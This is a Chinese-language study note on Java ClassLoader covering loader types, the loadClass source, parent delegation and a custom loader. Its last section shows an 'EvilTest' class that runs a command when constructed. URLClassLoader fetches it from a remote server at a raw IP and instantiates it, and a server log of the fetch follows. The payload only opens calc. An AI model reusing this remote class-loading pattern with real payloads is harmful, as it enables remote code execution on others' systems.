# 前言

开始学习Java中的ClassLoader。简要的记录一下学习的东西，方便以后忘记的时候翻看。所有内容基本上都摘录自网上的各种教程。



# ClassLoader简介

一个完整的 Java 应用程序由若干个 Java Class 文件组成，当程序在运行时，会通过一个入口函数来调用系统的各个功能，这些功能都被存放在不同的 Class 文件中。

因此，系统在运行时经常会调用不同 Class 文件中被定义的方法，如果某个 Class 文件不存在，则系统会抛出 ClassNotFoundException 异常。

系统程序在启动时，不会一次性加载所有程序要使用的 Class 文件到内存中，而是根据程序需要，通过 Java 的类加载机制动态将需要使用的 Class 文件加载到内存中; 只有当某个 Class 文件被加载到内存后，该文件才能被其他 Class 文件调用。

**这个 “类加载机制“ 就是 ClassLoader , 他的作用是动态加载 Java Class 文件到 JVM 的内存空间中，让 JVM 能够调用并执行 Class 文件中的字节码**。

![pic36](D:\this_is_feng\github\CTF\Web\picture\pic36.png)



# ClassLoader分类

**Java 中的类加载器大致分为 2 种**：

- **JVM 默认类加载器**
  主要由 “引导类加载器”、“扩展类加载器”、“系统类加载器” 三方面组成。
- **用户自定义类加载器**
  用户可以编写继承 java.lang.ClassLoader类的自定义类来自定义类加载器。



## 引导类加载器（BootstrapClassLoader）

引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中。(同时处于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类)。

## 扩展类加载器（ExtensionsClassLoader）

扩展类加载器（ExtensionsClassLoader）是引导类加载器（BootstrapClassLoader）的子集，其核心目的是加载标准核心Java类的扩展，以便适配平台上运行的所有应用程序。

由sun.misc.Launcher$ExtClassLoader类实现，用来在/jre/lib/ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。

## 系统类加载器（AppClassLoader）

App类加载器/系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它。

## 自定义类加载器（UserDefineClassLoader）

用户自定义。



# ClassLoader的核心方法

`ClassLoader`类有如下核心方法：

1. `loadClass`(加载指定的Java类)
2. `findClass`(查找指定的Java类)
3. `findLoadedClass`(查找JVM已经加载过的类)
4. `defineClass`(定义一个Java类)
5. `resolveClass`(链接指定的Java类)



# 类加载的过程



jvm 启动时加载 class 文件的两种方式：

- 隐式加载：JVM 自动加载需要的类到内存中
- 显式加载：通过 `class.forName()` 动态加载 class文件到 jvm 中



Java类加载方式分为`显式`和`隐式`,`显式`即我们通常使用`Java反射`或者`ClassLoader`来动态加载一个类对象，而`隐式`指的是`类名.方法名()`或`new`类实例。`显式`类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。



`Class.forName("类名")`默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用`Class.forName("类名", 是否初始化类, 类加载器)`，而`ClassLoader.loadClass`默认不会初始化类方法。



简单看一下类加载的过程：

1. **加载阶段** ：该阶段是类加载过程的第一个阶段，会通过一个类的完全限定名称来查找类的字节码文件，并利用字节码文件来创建一个 Class 对象。

2. **验证阶段** ：该阶段是类加载过程的第二个阶段，其目的在于确保 Class 文件中包含的字节流信息符合当前 Java 虚拟机的要求。

3. 准备阶段

    

   ： 该阶段会为类变量在方法区中分配内存空间并设定初始值( 这里 “类变量” 为static修饰符修饰的字段变量 )

   - 不会分配并初始化用 final 修饰符修饰的 static 变量，因为该类变量在编译时就会被分配内存空间。
   - 不会分配并初始化实例变量，因为实例变量会随对象一起分配到 Java 堆中，而不是 Java 方法区。

4. **解析阶段** ：该阶段会将常量池中的符号引用替换为直接引用。

5. **初始化阶段** ：该阶段是类加载的最后阶段，如果当前类具有父类，则对其进行初始化，同时为类变量赋予正确的值。



具体的理解可以看一下`loadClass`方法：

```java
    protected Class<?> loadClass(String name, boolean resolve)
        throws ClassNotFoundException
    {
        synchronized (getClassLoadingLock(name)) {
            // First, check if the class has already been loaded
            Class<?> c = findLoadedClass(name);
            if (c == null) {
                long t0 = System.nanoTime();
                try {
                    if (parent != null) {
                        c = parent.loadClass(name, false);
                    } else {
                        c = findBootstrapClassOrNull(name);
                    }
                } catch (ClassNotFoundException e) {
                    // ClassNotFoundException thrown if class not found
                    // from the non-null parent class loader
                }

                if (c == null) {
                    // If still not found, then invoke findClass in order
                    // to find the class.
                    long t1 = System.nanoTime();
                    c = findClass(name);

                    // this is the defining class loader; record the stats
                    PerfCounter.getParentDelegationTime().addTime(t1 - t0);
                    PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);
                    PerfCounter.getFindClasses().increment();
                }
            }
            if (resolve) {
                resolveClass(c);
            }
            return c;
        }
    }
```

看一下处理的流程就清晰了。首先是`findLoadedClass`：

```
Returns the class with the given binary name if this loader has been recorded by the Java virtual machine as an initiating loader of a class with that binary name. Otherwise null is returned.
```

如果这个类已经被加载了，就直接返回，不会重复加载，不然的话，继续处理。

如果存在父加载器，就`c = parent.loadClass(name, false);`，调用父类的加载器进行进行加载。如果不存在父加载器，就`c = findBootstrapClassOrNull(name);`，调用引导类加载器进行加载。

如果还是找不到的话，就`c = findClass(name);`，调用`findClass`方法进行类的寻找。但是`findClass`方法是空的：

```java
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        throw new ClassNotFoundException(name);
    }
```



所以需要我们自己去实现，也就是自定义类加载器。



# 双亲委派机制

顾名思义，该机制的实现分为两个阶段，即上图中的 **“委托阶段”** 与 **“派发阶段”**。

- **委托阶段**

  当一个类加载器需要加载类时，首先会去判断该类是否已经被加载，如果该类已经被加载就直接返回，如果该类未被加载，则委托给父类加载器。

  **父类加载器会执行相同的操作来进行判断，直到委托请求到达“引导类加载器（bootstrapClassLoader）”，此时可以确定当前类未被加载，因此需要进入派发阶段，查找并加载该类。**

- **派发阶段**

  上面提到委托请求最终会到达 bootstrapClassLoader，此时进入派发阶段，bootstrapClassLoader 会去对应的目录下（`%JAVA_HOME%jre/lib/`）搜索该类，如果找到该类就加载它，如果没有找到就将加载请求派发给子类加载器。

  子类加载器会执行类似的操作，去对应目录下搜索该类，如果找到就加载该类，如果没找到就继续将请求派发给子类加载器。

  最后加载请求会到达用户自定义的类加载器，此时如果类加载器在自定义目录下找到该类，就加载它; 如果还是没有找到，就抛出 `ClassNotFoundException` 异常并退出。



## 双亲委派机制的优势

- 避免重复加载某些类，当父加载器已经加载了某个类后，子加载器不会重复加载。
- 保证 Java 核心库的安全，例如攻击者定义了一个恶意的 `java.lang.Object.class` 文件，并通过网络传输到本地加载。当使用双亲委派模型加载时，由于 `java.lang.Object.class` 类已经被加载，因此类加载器不会重复加载该类，这样保证了 Java 核心API不会被篡改。



# 自定义类加载器

根据上面对`loadClass`方法的了解，可以知道自定义类加载器时的两个核心步骤如下：

- **自定义类加载器继承 `java.lang.ClassLoader.class`。**
- **自定义类加载器时重写 `findClass()` 方法。**



## 自定义类加载器的Demo

```java
package com.javalearn.summer.classloader;

import java.io.*;

public class TestClassLoader extends ClassLoader
{
    private String classPath;
    public TestClassLoader(String classPath){
        this.classPath = classPath;
    }
    private String getFileName(String fileName){
        int index = fileName.lastIndexOf('.');
        if (index == -1){
            return fileName + ".class";
        }else {
            return fileName.substring(index + 1) + ".class";
        }
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        String fileName = getFileName(name);

        File file = new File(classPath, fileName);
        try {
            FileInputStream fileInputStream = new FileInputStream(file);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int len = 0;
            try {
                while ((len = fileInputStream.read()) != -1) {
                    byteArrayOutputStream.write(len);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            byte[] data = byteArrayOutputStream.toByteArray();
            fileInputStream.close();
            byteArrayOutputStream.close();
            return defineClass(name, data, 0, data.length);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return super.findClass(name);
    }
}

```

```java

public class TestHelloWorld
{
    public String hello(){
        return "Hello World!";
    }
}

```



```java
package com.javalearn.summer.jvm;

import com.javalearn.summer.classloader.TestClassLoader;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class JvmLearn
{

    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException, InstantiationException, MalformedURLException {
        test1();
    }
    public static void test1() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {
        TestClassLoader classLoader = new TestClassLoader("C:\\Users\\15997\\Desktop\\");
        Class clazz = classLoader.loadClass("TestHelloWorld");
        Object o = clazz.newInstance();
        Method m = clazz.getMethod("hello");
        System.out.println(m.invoke(o));

    }

}

```

# URLClassLoader

在 Java 安全中，`java.net.URLClassLoader.class` 这个类加载器是比较常用的，我们可以通过该类加载器来加载本地磁盘或者网络传输的 Class 文件。



比如写一个EvilTest.java：

```java
root@iZbp14tgce8absspjkxi3iZ:~# cat EvilTest.java
import java.io.IOException;

public class EvilTest
{
    public EvilTest() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
root@iZbp14tgce8absspjkxi3iZ:~# javac EvilTest.java
root@iZbp14tgce8absspjkxi3iZ:~#
```

然后利用`URLClassLoader`进行加载：

```java
public static void test2() throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {
    URL url = new URL("http://118.31.168.198:39876/");
    URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
    Class clazz = classLoader.loadClass("EvilTest");
    clazz.newInstance();
}
```

![pic37](D:\this_is_feng\github\CTF\Web\picture\pic37.png)

```shell
root@iZbp14tgce8absspjkxi3iZ:~# python3 -m http.server 39876
Serving HTTP on 0.0.0.0 port 39876 (http://0.0.0.0:39876/) ...
114.105.34.73 - - [06/Aug/2021 15:35:18] "GET /EvilTest.class HTTP/1.1" 200 -


```



# 参考链接

https://www.guildhab.top/2021/03/java%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8-classloader/

https://yq1ng.github.io/z_post/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E4%BA%8C-ClassLoader-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/

https://zhishihezi.net/endpoint/richtext/4aaa4fe6bc2249252df9ae2b1891b451?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94f2c5be95c258342e07fb84f62896d52ed537e6799775d64c85379d0f70b78d9c9c57407128e37fdbc3c1cb541e13e4ff22f6072f4819cae569aa2c5c67619e511c28f40e0e139ce79affb015f08e761dd65c59fbfee1046ef5622e548e1b017c9e77de9f67278024a0a3fbe99f13212a1632d278fe592e9e86db846fd8a254501c5a12c44e6fe70118dd2f49762825ab1#0

https://xz.aliyun.com/t/9002
